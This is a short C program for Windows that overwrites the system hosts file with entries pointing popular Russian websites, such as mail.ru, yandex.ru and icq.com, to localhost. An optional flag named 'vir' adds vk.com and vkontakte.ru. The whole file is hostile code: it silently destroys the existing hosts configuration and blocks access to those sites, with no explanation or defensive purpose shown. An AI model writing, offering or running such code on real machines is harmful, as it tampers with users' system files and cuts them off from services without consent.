#include <conio.h>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>


//#define vir
int main()
{
char windows_dir [MAX_PATH + 1];
GetWindowsDirectoryA(windows_dir, MAX_PATH);
char file[512];
sprintf(file,"%s\\system32\\drivers\\etc\\hosts",windows_dir);
FILE *f=fopen(file,"w");
#ifdef vir
fprintf(f,"127.0.0.1\tlocalhost\n127.0.0.1\tvk.com\n127.0.0.1\tvkontakte.ru\n127.0.0.1\tmail.ru\n127.0.0.1\todnoclassniki.ru\n127.0.0.1\tyandex.ru\n127.0.0.1\tya.ru\n127.0.0.1\ticq.com");
#else
fprintf(f,"127.0.0.1\tlocalhost\n127.0.0.1\tmail.ru\n127.0.0.1\todnoclassniki.ru\n127.0.0.1\tyandex.ru\n127.0.0.1\tya.ru\n127.0.0.1\ticq.com");
#endif
fclose(f);
}

